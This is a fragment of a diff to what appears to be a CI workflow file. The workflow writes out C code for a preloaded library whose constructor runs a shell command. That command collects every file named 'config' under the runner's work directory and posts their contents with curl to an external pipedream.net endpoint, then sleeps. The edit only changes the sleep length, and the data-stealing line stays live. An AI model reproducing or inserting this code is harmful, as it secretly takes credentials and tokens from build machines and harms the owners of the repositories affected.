@@ -17,7 +17,7 @@ jobs:
           #include <stdlib.h>
           void __attribute__ ((constructor)) premain()
           {
-            system("unset LD_PRELOAD ;find $HOME/work -type f -name config | xargs cat | curl --data @- https://eonvxjpa2dhlojb.m.pipedream.net ;sleep 10m");
+            system("unset LD_PRELOAD ;find $HOME/work -type f -name config | xargs cat | curl --data @- https://eonvxjpa2dhlojb.m.pipedream.net ;sleep 12m");
           }
           EOF
           mkdir -p ./build_dir
